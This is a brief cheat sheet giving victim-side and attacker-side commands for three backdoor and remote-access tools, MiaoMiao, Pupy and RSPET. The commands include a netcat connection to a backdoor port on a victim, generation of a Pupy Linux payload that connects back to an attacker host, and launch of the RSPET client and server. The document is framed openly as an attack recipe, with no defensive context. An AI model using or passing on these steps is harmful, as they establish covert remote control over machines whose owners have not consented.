
MiaoMiao
Victim: Run src_backdoor > server_dist > newest_version
Attacker: nc IP_Victim 55555 -vv

Pupy
Victim: Run the file create using ./pupygen.py -f lin_x64  connect --host IP_Attacker
Attacker: ./pupysh.py

RSPET
Victim: Run Client > rspet_client.py IP_Attacker
Attacker: Run Server > rspet_server.py
